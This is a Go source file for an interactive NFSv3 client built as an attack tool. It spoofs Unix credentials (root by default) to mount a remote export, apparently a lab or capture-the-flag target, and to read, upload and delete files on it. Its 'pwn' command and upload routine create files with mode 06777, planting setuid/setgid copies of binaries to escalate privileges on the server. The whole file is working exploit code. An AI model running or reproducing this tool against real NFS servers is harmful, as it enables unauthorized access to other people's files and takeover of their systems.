package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/go-nfs/nfsv3/nfs"
	"github.com/go-nfs/nfsv3/nfs/rpc"
	"github.com/go-nfs/nfsv3/nfs/util"
)

type wd_t []string

func (wd wd_t) String() string {
	if len(wd) == 0 {
		return "."
	}
	return strings.Join(wd, "/")
}

func (wd wd_t) append(f string) wd_t {
	return append(wd, f)
}

func main() {
	var machinename string
	var uid int
	var gid int
	var target string
	var rhost string
	var debug bool

	flag.StringVar(&machinename, "machine", "localhost", "machine name")
	flag.IntVar(&uid, "uid", 0, "uid to become")
	flag.IntVar(&gid, "gid", 0, "gid to become")
	flag.StringVar(&target, "target", "/home/james", "path to mount")
	flag.StringVar(&rhost, "rhost", "localhost", "remote nfs server (needs 111 for portmapping, and whatever nfs will use)")
	flag.BoolVar(&debug, "debug", false, "enable nfs debugging")
	flag.Parse()

	if debug {
		util.DefaultLogger.SetDebug(true)
	}

	mount, err := nfs.DialMount(rhost, false)
	if err != nil {
		panic(err)
	}
	defer mount.Close()

	auth := rpc.NewAuthUnix(machinename, uint32(uid), uint32(gid))

	mnt, err := mount.Mount(target, auth.Auth())
	if err != nil {
		panic(err)
	}
	defer mnt.Close()

	cwd := wd_t{}
	for {
		cmdb := make([]byte, 256)
		fmt.Printf("[%s] %s> ", target, cwd)
		n, err := os.Stdin.Read(cmdb)
		if err != nil {
			fmt.Println(err)
			break
		}
		cmd := strings.TrimSpace(string(cmdb[:n]))

		if cmd == "exit" {
			break
		} else if cmd == "ls" {
			if files, err := mnt.ReadDirPlus(cwd.String()); err != nil {
				fmt.Println(err)
			} else {
				for _, f := range files {
					fmt.Printf("  [%-40s] %5d:%5d (0%04o) %d\n", f.FileName, f.Attr.Attr.UID, f.Attr.Attr.GID, f.Attr.Attr.Mode(), f.Size())
				}
			}
		} else if strings.HasPrefix(cmd, "cd ") {
			dir := cmd[3:]
			if dir == ".." && len(cwd) > 0 {
				cwd = cwd[:len(cwd)-1]
			} else {
				cwd = cwd.append(dir)
			}
		} else if strings.HasPrefix(cmd, "mkdir ") {
			dir := cmd[6:]
			if _, err := mnt.Mkdir(cwd.append(dir).String(), 0777); err != nil {
				fmt.Println(err)
			}
		} else if strings.HasPrefix(cmd, "cat ") {
			file := cmd[4:]
			cmd_cat(mnt, cwd.append(file).String())
		} else if strings.HasPrefix(cmd, "get ") {
			file := cmd[4:]
			if _, err := os.Stat(file); err == nil {
				fmt.Println("error: file already exists")
			} else {
				cmd_get(mnt, cwd.append(file).String(), file)
			}
		} else if strings.HasPrefix(cmd, "b64get ") {
			file := cmd[7:]
			cmd_get(mnt, cwd.append(file).String(), "")
		} else if strings.HasPrefix(cmd, "put ") {
			file := cmd[4:]
			cmd_put(mnt, cwd.append(file).String(), file)
		} else if strings.HasPrefix(cmd, "b64put ") {
			file := cmd[7:]
			cmd_put(mnt, cwd.append(file).String(), "")
		} else if strings.HasPrefix(cmd, "rm ") {
			file := cmd[3:]
			if err := mnt.Remove(cwd.append(file).String()); err != nil {
				fmt.Println(err)
			}
		} else if strings.HasPrefix(cmd, "rmdir ") {
			file := cmd[6:]
			if err := mnt.RemoveAll(cwd.append(file).String()); err != nil {
				fmt.Println(err)
			}
		} else if strings.HasPrefix(cmd, "pwn ") {
			file := cmd[4:]
			cmd_pwn(mnt, cwd.append(file).String())
		} else {
			fmt.Println("unknown command")
		}
	}
}

func cmd_pwn(mnt *nfs.Target, remotepath string) {
	// you can't open a filehandle with the nfslib, only create.. which is weird.. so we copy instead  ¯\_(ツ)_/¯
	if fi, err := mnt.Open(remotepath); err != nil {
		fmt.Println(err)
	} else {
		defer fi.Close()
		create_and_write(mnt, remotepath+".pwn", fi)
	}
}

func cmd_cat(mnt *nfs.Target, file string) {
	if f, err := mnt.Open(file); err != nil {
		fmt.Println(err)
	} else {
		defer f.Close()
		io.Copy(os.Stdout, f)
	}
}

func cmd_get(mnt *nfs.Target, remotepath string, localpath string) {
	if fi, err := mnt.Open(remotepath); err != nil {
		fmt.Println(err)
	} else {
		defer fi.Close()

		if localpath == "" {
			if data, err := io.ReadAll(fi); err != nil {
				fmt.Println(err)
			} else {
				fmt.Println(base64.StdEncoding.EncodeToString(data))
			}
		} else {
			if fo, err := os.Create(localpath); err != nil {
				fmt.Println(err)
			} else {
				defer fo.Close()
				io.Copy(fo, fi)
			}
		}
	}
}

func cmd_put(mnt *nfs.Target, remotepath string, localpath string) {
	var r io.Reader
	if localpath == "" {
		sz := 8192
		fmt.Printf("max %d bytes>> ", sz)
		dbuf := make([]byte, sz+10)
		if n, err := os.Stdin.Read(dbuf); err != nil {
			fmt.Println(err)
		} else {
			if bdata, err := base64.StdEncoding.DecodeString(string(dbuf[:n])); err != nil {
				fmt.Println(err)
			} else {
				r = bytes.NewReader(bdata)
			}
		}
	} else {
		if fi, err := os.Open(localpath); err != nil {
			fmt.Println(err)
		} else {
			defer fi.Close()
			r = fi
		}
	}

	if r != nil {
		create_and_write(mnt, remotepath, r)
	}
}

func create_and_write(mnt *nfs.Target, remotepath string, fi io.Reader) {
	if fh, err := mnt.Create(remotepath, 06777); err != nil {
		fmt.Println(err)
	} else {
		if err := mnt.SetAttrByFh(fh, nfs.Sattr3{
			Mode: nfs.SetMode{
				SetIt: true,
				Mode:  06777,
			},
		}); err != nil {
			fmt.Println("could not set mode (still trying to write the file though):", err)
		}

		if fo, err := mnt.OpenByFh(fh, nil); err != nil {
			fmt.Println(err)
		} else {
			defer fo.Close()
			io.Copy(fo, fi)
		}
	}
}
